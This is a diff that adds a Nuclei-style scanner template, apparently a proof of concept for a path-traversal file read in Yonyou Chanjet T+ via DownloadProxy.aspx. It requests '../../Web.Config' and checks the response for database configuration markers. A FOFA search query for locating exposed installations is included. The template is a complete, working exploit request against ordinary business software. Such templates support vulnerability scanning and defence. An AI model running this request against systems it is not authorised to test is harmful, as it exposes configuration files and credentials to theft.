@@ -1,0 +1,32 @@
+id: poc-local-oa-yonyou-chanjet-tplus-DownloadProxy-readfile
+
+info:
+  name: poc-local-oa-yonyou-chanjet-tplus-DownloadProxy-readfile
+  author: capiton
+  severity: high
+  description: ""
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzU2OTUzNTI2OQ==&mid=2247484284&idx=1&sn=d1d81167a59ee4f24a5564eaf27b925e&chksm=fcfc7d36cb8bf42097b44a55a515268dd466a39398cf9d2d733cd20b7820c9284ff020a9b546&scene=178&cur_album_id=2577829014602514435#rd
+  metadata:
+    fofa-query: app="畅捷通-TPlus"
+    Vulnerability-Impact: 用友畅捷通-tplus
+  tags: yonyou,chanjet
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SYSTEMDB"
+          - "ProductInfo"
+          - "<?xml"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
